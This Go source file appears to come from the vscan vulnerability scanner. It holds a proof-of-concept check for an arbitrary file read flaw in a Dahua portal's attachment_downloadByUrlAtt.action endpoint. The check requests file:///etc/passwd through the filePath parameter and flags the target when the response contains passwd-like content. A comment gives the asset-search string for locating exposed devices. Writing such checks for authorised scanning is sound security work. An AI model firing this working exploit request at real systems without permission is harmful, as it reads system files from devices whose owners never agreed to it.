package dahua

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

// 测绘语法
// "attachment_downloadByUrlAtt.action"
func Dahua_attachment_downloadByUrlAtt_file_read(u string) bool {

	if req, err := pkg.HttpRequset(u+"/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd", "GET", "", false, nil); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "root") && strings.Contains(req.Body, "0") && strings.Contains(req.Body, "bin") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln dahua file_read|%s\n", u+"/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"))
			return true
			//fmt.Println(resourceUuid)

			//resourceUuid := re.FindStringSubmatch(req.Body)[1]

		}
	}
	return false
}
